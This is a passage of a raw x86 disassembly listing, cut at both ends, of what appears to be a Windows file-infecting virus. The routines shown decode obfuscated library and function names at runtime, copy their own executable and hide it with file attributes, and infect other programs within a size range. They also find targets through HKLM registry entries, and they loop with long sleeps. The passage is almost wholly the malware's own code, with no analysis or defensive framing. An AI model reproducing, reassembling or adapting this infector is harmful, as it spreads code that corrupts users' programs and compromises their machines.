loc_40559A:				; CODE XREF: sub_4054EF+37j
		lea	ecx, [ebp+var_14]
		call	sub_401808
		mov	eax, esi
		pop	esi

loc_4055A5:				; CODE XREF: sub_4054EF+24j
		pop	edi
		leave
		retn
sub_4054EF	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_4055A8	proc near		; CODE XREF: sub_4053E8+E6p
		push	ebx
		push	ebp
		push	esi
		push	edi
		push	2
		push	offset LibFileName ; "ÇZXÕŞVÚy\\XXnËÜWYÜX"
		call	sub_403434
		mov	ebx, ds:LoadLibraryA
		pop	ecx
		pop	ecx
		push	eax		; lpLibFileName
		call	ebx ; LoadLibraryA
		mov	esi, ds:GetProcAddress
		mov	ebp, eax
		test	ebp, ebp
		mov	edi, offset ProcName ; "GÜİÚ×TÜWÇÜWUÚßÜFWÙßÜ××nIÜTÇZŞWÜÎ\\\\nÇJLÜ"...
		jz	short loc_40560D
		push	1
		push	edi
		call	sub_403434
		pop	ecx
		pop	ecx
		push	eax		; lpProcName
		push	ebp		; hModule
		call	esi ; GetProcAddress
		push	4
		push	edi
		mov	dword_491F10, eax
		call	sub_403434
		pop	ecx
		pop	ecx
		push	eax		; lpProcName
		push	ebp		; hModule
		call	esi ; GetProcAddress
		push	5
		push	edi
		mov	dword_491F0C, eax
		call	sub_403434
		pop	ecx
		pop	ecx
		push	eax		; lpProcName
		push	ebp		; hModule
		call	esi ; GetProcAddress
		mov	dword_491F14, eax

loc_40560D:				; CODE XREF: sub_4055A8+2Aj
		push	3
		push	offset LibFileName ; "ÇZXÕŞVÚy\\XXnËÜWYÜX"
		call	sub_403434
		pop	ecx
		pop	ecx
		push	eax		; lpLibFileName
		call	ebx ; LoadLibraryA
		mov	ebp, eax
		test	ebp, ebp
		jz	short loc_405637
		push	3
		push	edi
		call	sub_403434
		pop	ecx
		pop	ecx
		push	eax		; lpProcName
		push	ebp		; hModule
		call	esi ; GetProcAddress
		mov	dword_491F18, eax

loc_405637:				; CODE XREF: sub_4055A8+7Aj
		mov	edi, offset aYYTyXxnYtWyTTY ; "ÕÚYÚYÜTy\\XXnÊYTÜWYÜTÍÜTÏÙYYÜßTÜ\\ÇTŞTÜnn"...
		push	edi		; lpLibFileName
		call	ebx ; LoadLibraryA
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_405658
		push	1
		push	edi
		call	sub_403434
		pop	ecx
		pop	ecx
		push	eax		; lpProcName
		push	ebx		; hModule
		call	esi ; GetProcAddress
		mov	dword_491F1C, eax

loc_405658:				; CODE XREF: sub_4055A8+9Bj
		pop	edi
		pop	esi
		pop	ebp
		pop	ebx
		retn
sub_4055A8	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_40565D	proc near		; CODE XREF: sub_405CE6+107p

var_65C		= dword	ptr -65Ch
var_64C		= byte ptr -64Ch
var_548		= byte ptr -548h
ExistingFileName= byte ptr -444h
var_340		= byte ptr -340h
var_23C		= byte ptr -23Ch
FileName	= byte ptr -138h
var_34		= dword	ptr -34h
var_1C		= dword	ptr -1Ch
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 64Ch
		push	ebx
		push	esi
		push	edi
		lea	ecx, [ebp+var_1C]
		call	sub_40174B
		mov	edi, [ebp+arg_0]
		xor	ebx, ebx
		push	edi
		mov	[ebp+var_C], ebx
		call	sub_40471A
		test	eax, eax
		pop	ecx
		jnz	loc_4058E6
		push	edi
		call	sub_40504A
		test	eax, eax
		pop	ecx
		jnz	loc_4058E6
		mov	esi, (offset ProcName+68h)
		push	ebx
		push	esi
		call	sub_403464
		mov	[ebp+var_4], eax
		lea	eax, [ebp+var_548]
		push	ebx		; char *
		push	eax		; char *
		push	ebx		; char *
		push	ebx		; char *
		push	edi		; char *
		call	__splitpath
		add	esp, 1Ch
		cmp	[ebp+var_4], ebx
		mov	[ebp+arg_0], ebx
		jle	short loc_4056F2

loc_4056C1:				; CODE XREF: sub_40565D+93j
		push	[ebp+arg_0]
		push	esi
		call	sub_403434
		cmp	[eax], bl
		pop	ecx
		pop	ecx
		jz	short loc_4056E7
		push	eax
		lea	eax, [ebp+var_548]
		push	eax
		call	sub_403B7D
		pop	ecx
		test	eax, eax
		pop	ecx
		jnz	loc_4058E6

loc_4056E7:				; CODE XREF: sub_40565D+71j
		inc	[ebp+arg_0]
		mov	eax, [ebp+arg_0]
		cmp	eax, [ebp+var_4]
		jl	short loc_4056C1

loc_4056F2:				; CODE XREF: sub_40565D+62j
		lea	eax, [ebp+FileName]
		push	eax		; nSize
		call	sub_403D8C
		lea	eax, [ebp+ExistingFileName]
		mov	[esp+65Ch+var_65C], 104h
		push	eax		; lpFilename
		push	ebx		; hModule
		call	ds:GetModuleFileNameA
		lea	eax, [ebp+FileName]
		push	ebx		; bFailIfExists
		push	eax		; lpNewFileName
		lea	eax, [ebp+ExistingFileName]
		push	eax		; lpExistingFileName
		call	ds:CopyFileA
		test	eax, eax
		jz	loc_4058E6
		mov	esi, ds:SetFileAttributesA
		lea	eax, [ebp+FileName]
		push	20h		; dwFileAttributes
		push	eax		; lpFileName
		call	esi ; SetFileAttributesA
		push	13000h
		lea	eax, [ebp+FileName]
		push	edi
		push	eax
		call	sub_404CF1
		add	esp, 0Ch
		test	eax, eax
		jz	loc_4058D9
		lea	eax, [ebp+var_8]
		push	ebx
		push	eax
		push	edi
		lea	ecx, [ebp+var_1C]
		call	sub_40174E
		cmp	eax, ebx
		mov	[ebp+arg_0], eax
		jz	loc_4058D9
		cmp	[ebp+var_8], 13000h
		jbe	loc_4058D1
		cmp	[ebp+var_8], 300000h
		jnb	loc_4058D1
		lea	eax, [ebp+ExistingFileName]
		push	ebx		; char *
		push	eax		; char *
		lea	eax, [ebp+var_64C]
		push	eax		; char *
		lea	eax, [ebp+var_23C]
		push	eax		; char *
		push	edi		; char *
		call	__splitpath
		lea	eax, [ebp+var_64C]
		push	eax		; char *
		lea	eax, [ebp+var_23C]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+ExistingFileName]
		push	eax		; char *
		lea	eax, [ebp+var_23C]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_23C]
		push	offset a__2	; char *
		push	eax		; char *
		call	_strcat
		push	4
		push	3
		lea	eax, [ebp+var_340]
		push	3
		push	eax
		call	sub_403624
		movsx	eax, [ebp+var_340]
		push	eax		; int
		call	_tolower
		add	esp, 40h
		mov	[ebp+var_340], al
		lea	eax, [ebp+var_340]
		push	eax		; char *
		lea	eax, [ebp+var_23C]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_C]
		push	eax
		push	[ebp+var_8]
		push	[ebp+arg_0]
		call	sub_4070D1
		add	esp, 14h
		cmp	eax, ebx
		mov	[ebp+arg_0], eax
		lea	ecx, [ebp+var_1C]
		jz	loc_4058D4
		call	sub_401808
		push	[ebp+var_C]
		lea	eax, [ebp+var_23C]
		push	[ebp+arg_0]
		push	eax
		call	sub_403CBB
		add	esp, 0Ch
		lea	eax, [ebp+var_23C]
		push	27h		; dwFileAttributes
		push	eax		; lpFileName
		call	esi ; SetFileAttributesA
		lea	eax, [ebp+var_34]
		push	eax
		push	edi
		call	sub_40402D
		pop	ecx
		mov	[ebp+var_4], eax
		pop	ecx
		push	20h		; dwFileAttributes
		push	edi		; lpFileName
		call	esi ; SetFileAttributesA
		push	ebx		; bFailIfExists
		lea	eax, [ebp+FileName]
		push	edi		; lpNewFileName
		push	eax		; lpExistingFileName
		call	ds:CopyFileA
		lea	eax, [ebp+FileName]
		push	eax
		call	sub_403DFA
		lea	eax, [ebp+var_23C]
		push	eax		; char *
		push	offset byte_40F0D4 ; char *
		call	_strcpy
		push	offset aI	; ""
		push	edi
		call	sub_4054EF
		add	esp, 14h
		cmp	[ebp+var_4], ebx
		jz	short loc_4058C3
		lea	eax, [ebp+var_34]
		push	eax
		push	edi
		call	sub_404075
		pop	ecx
		pop	ecx

loc_4058C3:				; CODE XREF: sub_40565D+258j
		push	[ebp+arg_0]
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx
		push	1
		pop	eax
		jmp	short loc_4058E8
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4058D1:				; CODE XREF: sub_40565D+121j
					; sub_40565D+12Ej
		lea	ecx, [ebp+var_1C]

loc_4058D4:				; CODE XREF: sub_40565D+1DCj
		call	sub_401808

loc_4058D9:				; CODE XREF: sub_40565D+FBj
					; sub_40565D+114j
		lea	eax, [ebp+FileName]
		push	eax
		call	sub_403DFA
		pop	ecx

loc_4058E6:				; CODE XREF: sub_40565D+25j
					; sub_40565D+34j ...
		xor	eax, eax

loc_4058E8:				; CODE XREF: sub_40565D+272j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_40565D	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4058ED	proc near		; CODE XREF: WinMain(x,x,x,x)+34p

var_428		= byte ptr -428h
var_324		= byte ptr -324h
var_220		= byte ptr -220h
var_21B		= byte ptr -21Bh
var_11C		= byte ptr -11Ch
var_18		= dword	ptr -18h
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 428h
		push	esi
		lea	ecx, [ebp+var_18]
		call	sub_40174B
		and	[ebp+var_4], 0
		lea	eax, [ebp+var_8]
		push	1
		push	eax
		push	[ebp+arg_0]
		lea	ecx, [ebp+var_18]
		call	sub_40174E
		mov	esi, eax
		test	esi, esi
		jz	loc_4059B1
		lea	eax, [ebp+var_220]
		push	eax		; char *
		lea	eax, [ebp+var_428]
		push	eax		; char *
		lea	eax, [ebp+var_324]
		push	eax		; char *
		lea	eax, [ebp+var_11C]
		push	eax		; char *
		push	[ebp+arg_0]	; char *
		call	__splitpath
		lea	eax, [ebp+var_324]
		push	eax		; char *
		lea	eax, [ebp+var_11C]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_428]
		push	eax		; char *
		lea	eax, [ebp+var_11C]
		push	eax		; char *
		call	_strcat
		and	[ebp+var_21B], 0
		lea	eax, [ebp-21Fh]
		push	eax		; char *
		lea	eax, [ebp+var_11C]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_11C]
		push	offset aYRNyWnyvNy_Tnn ; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_4]
		push	eax
		push	[ebp+var_8]
		push	esi
		call	sub_4071E0
		mov	esi, eax
		add	esp, 40h
		test	esi, esi
		lea	ecx, [ebp+var_18]
		jnz	short loc_4059B5
		call	sub_401808

loc_4059B1:				; CODE XREF: sub_4058ED+2Bj
		xor	eax, eax
		jmp	short loc_405A09
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4059B5:				; CODE XREF: sub_4058ED+BDj
		call	sub_401808
		push	[ebp+var_4]
		lea	eax, [ebp+var_11C]
		push	esi
		push	eax
		call	sub_403CBB
		push	esi
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 10h
		xor	esi, esi
		call	ds:GetCommandLineA
		push	eax
		lea	eax, [ebp+var_11C]
		push	eax
		call	sub_4046D7
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_405A07
		push	0FFFFFFFFh	; dwMilliseconds
		push	eax		; hHandle
		call	ds:WaitForSingleObject
		lea	eax, [ebp+var_11C]
		push	eax
		call	sub_403DFA
		pop	ecx
		push	1
		pop	esi

loc_405A07:				; CODE XREF: sub_4058ED+FFj
		mov	eax, esi

loc_405A09:				; CODE XREF: sub_4058ED+C6j
		pop	esi
		leave
		retn
sub_4058ED	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_405A0C	proc near		; CODE XREF: sub_4060CD+4Ep

var_104		= dword	ptr -104h
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 104h
		lea	eax, [ebp+var_104]
		push	104h
		push	eax
		push	offset unk_4119B0
		push	5
		push	offset aTW@WT@Y@WwYteW ; "ÇÙ]TÕŞWÜ@ÈÚßWÙ×Ù]T@ÅÚY\\ÙÕ×@ÏÔWWÜYTEÜW×Ú"...
		call	sub_403434
		pop	ecx
		pop	ecx
		push	eax
		push	80000001h
		call	sub_4044E4
		push	1
		lea	eax, [ebp+var_104]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		push	eax
		call	sub_40444A
		add	esp, 24h
		leave
		retn
sub_405A0C	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_405A58	proc near		; DATA XREF: sub_4069EE+32o
					; sub_406A3B+62o

var_20C		= byte ptr -20Ch
var_108		= byte ptr -108h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 20Ch
		push	ebx
		xor	ebx, ebx
		cmp	[ebp+arg_4], ebx
		push	esi
		push	edi
		mov	[ebp+var_4], ebx
		jnz	loc_405BFD
		mov	esi, (offset aTvynEf+6)
		push	ebx
		push	esi
		call	sub_403464
		mov	edi, eax
		lea	eax, [ebp+var_20C]
		push	eax		; char *
		lea	eax, [ebp+var_108]
		push	eax		; char *
		push	ebx		; char *
		push	ebx		; char *
		mov	[ebp+var_108], bl
		push	[ebp+arg_0]	; char *
		call	__splitpath
		add	esp, 1Ch
		dec	edi
		cmp	edi, ebx
		mov	[ebp+arg_4], ebx
		jle	short loc_405ADA

loc_405AA9:				; CODE XREF: sub_405A58+80j
		push	[ebp+arg_4]
		push	esi
		call	sub_403434
		push	eax
		lea	eax, [ebp+var_108]
		push	eax
		call	unknown_libname_9 ; Microsoft VisualC 2-7/net runtime
		add	esp, 10h
		test	eax, eax
		jnz	short loc_405AD2
		cmp	[ebp+arg_4], edi
		jz	short loc_405AD2
		mov	[ebp+var_4], 1

loc_405AD2:				; CODE XREF: sub_405A58+6Cj
					; sub_405A58+71j
		inc	[ebp+arg_4]
		cmp	[ebp+arg_4], edi
		jl	short loc_405AA9

loc_405ADA:				; CODE XREF: sub_405A58+4Fj
		lea	eax, [ebp+var_20C]
		push	eax		; char *
		lea	eax, [ebp+var_108]
		push	eax		; char *
		call	_strcat
		mov	esi, offset unk_40FAF7
		push	ebx
		push	esi
		call	sub_403464
		add	esp, 10h
		xor	edi, edi
		cmp	eax, ebx
		mov	[ebp+arg_4], eax
		jle	short loc_405B2D

loc_405B05:				; CODE XREF: sub_405A58+D3j
		push	edi
		push	esi
		call	sub_403434
		push	eax
		lea	eax, [ebp+var_108]
		push	eax
		call	unknown_libname_9 ; Microsoft VisualC 2-7/net runtime
		add	esp, 10h
		test	eax, eax
		jnz	short loc_405B27
		mov	[ebp+var_4], 1

loc_405B27:				; CODE XREF: sub_405A58+C6j
		inc	edi
		cmp	edi, [ebp+arg_4]
		jl	short loc_405B05

loc_405B2D:				; CODE XREF: sub_405A58+ABj
		cmp	[ebp+var_4], ebx
		jz	short loc_405B5B
		push	1
		push	(offset	aYYTyXxnYtWyTTY+28h)
		call	sub_403434
		mov	esi, [ebp+arg_0]
		push	eax
		push	esi
		call	sub_403B7D
		add	esp, 10h
		test	eax, eax
		jnz	short loc_405B5E
		push	esi
		call	sub_403DFA
		pop	ecx
		jmp	loc_405BFD
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_405B5B:				; CODE XREF: sub_405A58+D8j
		mov	esi, [ebp+arg_0]

loc_405B5E:				; CODE XREF: sub_405A58+F5j
		push	esi
		call	sub_403C40
		mov	edi, eax
		pop	ecx
		cmp	edi, ebx
		jl	short loc_405BA0
		push	esi		; char *
		push	offset byte_491CF0 ; char *
		call	_strcpy
		pop	ecx
		cmp	edi, 4
		pop	ecx
		jge	short loc_405BB3
		push	esi		; char *
		push	offset byte_491DF4 ; char *
		call	_strcpy
		push	1
		push	7D000h
		push	dword_4919E0
		push	esi
		call	sub_40444A
		add	esp, 18h
		jmp	short loc_405BB3
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_405BA0:				; CODE XREF: sub_405A58+111j
		cmp	edi, 0FFFFFF9Ch
		jnz	short loc_405BB3
		push	ebx
		push	0FFFFFFFFh
		push	0FFFFFFFFh
		push	esi
		call	sub_406AB2
		add	esp, 10h

loc_405BB3:				; CODE XREF: sub_405A58+123j
					; sub_405A58+146j ...
		mov	edx, dword_491F20
		imul	edx, 12Ch
		cmp	edx, 1B58h
		jle	short loc_405BDE
		push	ebx
		call	sub_4046AB
		pop	ecx
		xor	edx, edx
		push	5
		pop	ecx
		div	ecx
		add	edx, 7
		imul	edx, 3E8h

loc_405BDE:				; CODE XREF: sub_405A58+16Dj
		push	edx		; dwMilliseconds
		call	ds:Sleep
		inc	dword_491F20
		cmp	dword_491F20, 2710h
		jle	short loc_405BFD
		mov	dword_491F20, ebx

loc_405BFD:				; CODE XREF: sub_405A58+14j
					; sub_405A58+FEj ...
		push	1
		pop	eax
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_405A58	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_405C05	proc near		; DATA XREF: sub_405CA4+2Eo

var_30C		= byte ptr -30Ch
var_208		= byte ptr -208h
var_105		= byte ptr -105h
var_104		= byte ptr -104h
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 30Ch
		push	ebx
		xor	ebx, ebx
		lea	eax, [ebp+var_30C]
		push	ebx		; char *
		push	eax		; char *
		lea	eax, [ebp+var_104]
		push	eax		; char *
		push	ebx		; char *
		push	[ebp+arg_0]	; char *
		call	__splitpath
		add	esp, 14h
		cmp	[ebp+arg_4], ebx
		jnz	short loc_405C9E
		cmp	[ebp+arg_8], ebx
		jnz	short loc_405C75
		lea	eax, [ebp+var_104]
		push	eax		; char *
		call	_strlen
		cmp	eax, ebx
		pop	ecx
		jz	short loc_405C4E
		mov	[ebp+eax+var_105], bl

loc_405C4E:				; CODE XREF: sub_405C05+40j
		lea	eax, [ebp+var_208]
		push	ebx		; char *
		push	eax		; char *
		push	ebx		; char *
		lea	eax, [ebp+var_104]
		push	ebx		; char *
		push	eax		; char *
		call	__splitpath
		lea	eax, [ebp+var_208]
		push	eax
		call	sub_403C01
		add	esp, 18h
		jmp	short loc_405C82
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_405C75:				; CODE XREF: sub_405C05+2Fj
		lea	eax, [ebp+var_30C]
		push	eax
		call	sub_403C01
		pop	ecx

loc_405C82:				; CODE XREF: sub_405C05+6Ej
		test	eax, eax
		jz	short loc_405C9E
		push	1
		push	7D000h
		push	dword_4919E0
		push	[ebp+arg_0]
		call	sub_40444A
		add	esp, 10h

loc_405C9E:				; CODE XREF: sub_405C05+2Aj
					; sub_405C05+7Fj
		push	1
		pop	eax
		pop	ebx
		leave
		retn
sub_405C05	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_405CA4	proc near		; CODE XREF: sub_405CE6+143p
					; sub_405E8C+40p ...

arg_0		= dword	ptr  0Ch

		push	esi
		push	edi
		mov	edi, [esp+arg_0]
		push	1
		pop	esi
		push	offset unk_40F94A
		push	edi
		call	sub_403B7D
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_405CE3
		push	offset unk_40F949
		push	edi
		call	sub_403B7D
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_405CD1
		xor	esi, esi

loc_405CD1:				; CODE XREF: sub_405CA4+29j
		push	esi
		push	offset sub_405C05
		push	edi
		call	sub_403E11
		add	esp, 0Ch
		push	1
		pop	eax

loc_405CE3:				; CODE XREF: sub_405CA4+18j
		pop	edi
		pop	esi
		retn
sub_405CA4	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_405CE6	proc near		; DATA XREF: sub_405E44+28o

var_B0C		= byte ptr -0B0Ch
Dst		= byte ptr -70Ch
var_30C		= byte ptr -30Ch
var_208		= byte ptr -208h
Src		= byte ptr -104h
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 0B0Ch
		mov	eax, [ebp+arg_C]
		push	ebx
		push	esi
		push	edi
		push	[ebp+arg_4]	; char *
		xor	ebx, ebx
		mov	[eax], ebx
		lea	eax, [ebp+var_B0C]
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+var_B0C]
		push	offset asc_40E044 ; char *
		push	eax		; char *
		call	_strcat
		push	[ebp+arg_8]	; char *
		lea	eax, [ebp+var_B0C]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+Dst]
		push	400h
		push	eax
		lea	eax, [ebp+var_B0C]
		push	ebx
		push	eax
		push	80000002h
		call	sub_4044E4
		lea	eax, [ebp+Dst]
		push	eax		; char *
		lea	eax, [ebp+Src]
		push	eax		; char *
		call	_strcpy
		add	esp, 34h
		lea	eax, [ebp+Dst]
		push	104h		; nSize
		push	eax		; lpDst
		lea	eax, [ebp+Src]
		push	eax		; lpSrc
		call	ds:ExpandEnvironmentStringsA
		mov	esi, (offset aTvynEf+6)
		push	ebx
		push	esi
		call	sub_403464
		mov	[ebp+arg_C], eax
		lea	eax, [ebp+var_30C]
		push	ebx		; char *
		push	eax		; char *
		push	ebx		; char *
		lea	eax, [ebp+Dst]
		push	ebx		; char *
		push	eax		; char *
		call	__splitpath
		add	esp, 1Ch
		xor	edi, edi
		cmp	[ebp+arg_C], ebx
		jle	short loc_405DCF

loc_405DA4:				; CODE XREF: sub_405CE6+E2j
		push	edi
		push	esi
		call	sub_403434
		cmp	[eax], bl
		pop	ecx
		pop	ecx
		jz	short loc_405DC4
		push	eax
		lea	eax, [ebp+var_30C]
		push	eax
		call	sub_403B7D
		pop	ecx
		test	eax, eax
		pop	ecx
		jnz	short loc_405DCA

loc_405DC4:				; CODE XREF: sub_405CE6+C9j
		inc	edi
		cmp	edi, [ebp+arg_C]
		jl	short loc_405DA4

loc_405DCA:				; CODE XREF: sub_405CE6+DCj
		cmp	edi, [ebp+arg_C]
		jl	short loc_405DF3

loc_405DCF:				; CODE XREF: sub_405CE6+BCj
		lea	eax, [ebp+Dst]
		push	(offset	ProcName+90h)
		push	eax
		call	sub_403B7D
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_405DF3
		lea	eax, [ebp+Dst]
		push	eax
		call	sub_40565D
		pop	ecx

loc_405DF3:				; CODE XREF: sub_405CE6+E7j
					; sub_405CE6+FEj
		push	ebx		; char *
		lea	eax, [ebp+var_208]
		push	ebx		; char *
		push	eax		; char *
		lea	eax, [ebp+Src]
		push	eax		; char *
		lea	eax, [ebp+Dst]
		push	eax		; char *
		call	__splitpath
		lea	eax, [ebp+var_208]
		push	eax		; char *
		lea	eax, [ebp+Src]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+Src]
		push	eax
		call	sub_405CA4
		add	esp, 20h
		push	3E8h		; dwMilliseconds
		call	ds:Sleep
		push	1
		pop	eax
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_405CE6	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

; DWORD	__stdcall sub_405E44(LPVOID)
sub_405E44	proc near		; DATA XREF: sub_406F66+42o

var_108		= dword	ptr -108h
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 108h

loc_405E4D:				; CODE XREF: sub_405E44+46j
		and	byte ptr [ebp+var_108],	0
		lea	eax, [ebp+var_108]
		push	1
		push	eax
		call	sub_403BD8
		lea	eax, [ebp+var_4]
		push	eax
		lea	eax, [ebp+var_108]
		push	offset sub_405CE6
		push	eax
		push	80000002h
		call	sub_404586
		add	esp, 18h
		push	36EE80h		; dwMilliseconds
		call	ds:Sleep
		jmp	short loc_405E4D
sub_405E44	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_405E8C	proc near		; DATA XREF: sub_405EE4+9Co

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		cmp	[ebp+arg_4], 0
		jnz	short loc_405EC9
		cmp	[ebp+arg_8], 0
		jnz	short loc_405EA3
		push	5		; dwMilliseconds
		call	ds:Sleep

loc_405EA3:				; CODE XREF: sub_405E8C+Dj
		push	[ebp+arg_0]
		call	sub_403C40
		test	eax, eax
		pop	ecx
		jl	short loc_405EC4
		cmp	eax, 3
		jge	short loc_405EC4
		push	[ebp+arg_0]	; char *
		push	offset byte_491DF4 ; char *
		call	_strcpy
		pop	ecx
		pop	ecx

loc_405EC4:				; CODE XREF: sub_405E8C+22j
					; sub_405E8C+27j
		push	1
		pop	eax
		pop	ebp
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_405EC9:				; CODE XREF: sub_405E8C+7j
		push	[ebp+arg_0]
		call	sub_405CA4
		test	eax, eax
		pop	ecx
		jz	short loc_405EDA
		xor	eax, eax
		pop	ebp
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_405EDA:				; CODE XREF: sub_405E8C+48j
		xor	eax, eax
		cmp	[ebp+arg_8], eax
		setz	al
		pop	ebp
		retn
sub_405E8C	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_405EE4	proc near		; CODE XREF: sub_4060CD+57p

RootPathName	= byte ptr -10Ch
var_8		= dword	ptr -8
var_1		= byte ptr -1
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 10Ch
		and	[ebp+RootPathName], 0
		push	ebx
		lea	eax, [ebp+RootPathName]
		push	104h
